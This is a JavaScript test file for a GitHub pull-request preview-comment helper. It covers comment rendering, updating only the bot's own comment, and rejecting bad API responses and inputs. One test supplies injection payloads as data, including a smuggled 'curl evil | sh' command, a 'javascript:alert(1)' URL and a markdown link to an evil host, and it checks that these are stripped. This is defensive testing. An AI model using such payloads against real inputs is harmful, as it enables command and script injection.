import assert from 'node:assert/strict';
import { test } from 'node:test';
import { COMMENT_MARKER, renderComment } from '../comment.mjs';
import { GitHubError, upsertComment } from '../github.mjs';
import { fakeFetch } from './helpers.mjs';

test('deployed comment carries the marker, URL, commit and run', () => {
  const body = renderComment({
    status: 'deployed',
    sha: 'abcdef0123456789',
    url: 'https://hostmark-pr-3.example.workers.dev',
    runUrl: 'https://github.com/o/r/actions/runs/123',
    databaseBranch: 'preview/pr-3',
  });
  assert.ok(body.startsWith(COMMENT_MARKER));
  assert.match(body, /<https:\/\/hostmark-pr-3\.example\.workers\.dev>/);
  assert.match(body, /`abcdef012345`/);
  assert.match(body, /preview\/pr-3/);
});

test('values that do not match their shape are left out, not escaped', () => {
  const body = renderComment({
    status: 'deployed',
    sha: '`; curl evil | sh`',
    url: 'javascript:alert(1)',
    runUrl: 'https://evil.example/actions/runs/1',
    databaseBranch: '[x](https://evil)',
  });
  assert.doesNotMatch(body, /evil|javascript|curl/);
  assert.match(body, /Preview deployed/);
});

test('closed and failed comments show no URL', () => {
  assert.doesNotMatch(renderComment({ status: 'closed', url: 'https://x.example.com' }), /x\.example\.com/);
  assert.match(renderComment({ status: 'failed' }), /failed/);
  assert.match(renderComment({ status: 'cleanup-failed' }), /may be left/);
  assert.throws(() => renderComment({ status: 'weird' }), /unknown preview status/);
});

const args = (fetch, over = {}) => ({
  token: 't',
  repo: 'o/r',
  pr: 5,
  body: renderComment({ status: 'closed' }),
  fetch,
  apiUrl: 'https://api.test',
  ...over,
});
const bot = { id: 9, user: { login: 'github-actions[bot]' }, body: `${COMMENT_MARKER} old` };

test('creates the comment when there is none', async () => {
  const fetch = fakeFetch([
    { method: 'GET', match: '/issues/5/comments', json: [] },
    { method: 'POST', match: '/issues/5/comments', json: { id: 1 } },
  ]);
  assert.deepEqual(await upsertComment(args(fetch)), { action: 'created', id: 1 });
});

test('updates the bot comment in place', async () => {
  const fetch = fakeFetch([
    { method: 'GET', match: '/issues/5/comments', json: [bot] },
    { method: 'PATCH', match: '/issues/comments/9', json: {} },
  ]);
  assert.deepEqual(await upsertComment(args(fetch)), { action: 'updated', id: 9 });
});

test('a user comment carrying the marker is never edited', async () => {
  const impostor = { id: 4, user: { login: 'mallory' }, body: COMMENT_MARKER };
  const fetch = fakeFetch([
    { method: 'GET', match: '/issues/5/comments', json: [impostor] },
    { method: 'POST', match: '/issues/5/comments', json: { id: 2 } },
  ]);
  assert.equal((await upsertComment(args(fetch))).action, 'created');
});

test('API failures and malformed answers throw', async () => {
  await assert.rejects(
    upsertComment(args(fakeFetch([{ method: 'GET', match: 'comments', status: 403, json: {} }]))),
    /403/,
  );
  await assert.rejects(
    upsertComment(args(fakeFetch([{ method: 'GET', match: 'comments', json: { not: 'array' } }]))),
    /not an array/,
  );
  await assert.rejects(
    upsertComment(
      args(
        fakeFetch([
          { method: 'GET', match: 'comments', json: [] },
          { method: 'POST', match: 'comments', json: {} },
        ]),
      ),
    ),
    /without an id/,
  );
  await assert.rejects(
    upsertComment(args(fakeFetch([{ method: 'GET', match: 'comments', throws: 'timeout' }]))),
    GitHubError,
  );
});

test('bad inputs are refused before any call', async () => {
  const fetch = fakeFetch([]);
  await assert.rejects(upsertComment(args(fetch, { token: '' })), /GITHUB_TOKEN/);
  await assert.rejects(upsertComment(args(fetch, { repo: 'a/b/c' })), /owner\/name/);
  await assert.rejects(upsertComment(args(fetch, { pr: 0 })), /positive integer/);
  await assert.rejects(upsertComment(args(fetch, { body: 'no marker' })), /marker/);
  assert.equal(fetch.calls.length, 0);
});
